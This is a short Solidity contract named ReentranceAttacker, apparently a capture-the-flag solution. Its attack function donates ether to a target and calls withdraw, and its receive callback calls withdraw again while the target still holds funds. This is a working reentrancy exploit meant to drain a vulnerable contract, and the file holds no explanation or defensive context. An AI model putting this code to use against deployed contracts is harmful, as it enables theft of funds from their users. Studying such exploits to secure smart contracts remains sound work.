pragma solidity 0.8.15;

contract ReentranceAttacker {
    function attack(address target) external payable {
        payable(target).call{value: msg.value}(abi.encodeWithSignature("donate(address)", address(this)));
        target.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
    }

    receive() external payable {
        if(msg.sender.balance > 0) {
            msg.sender.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
        }
    }
}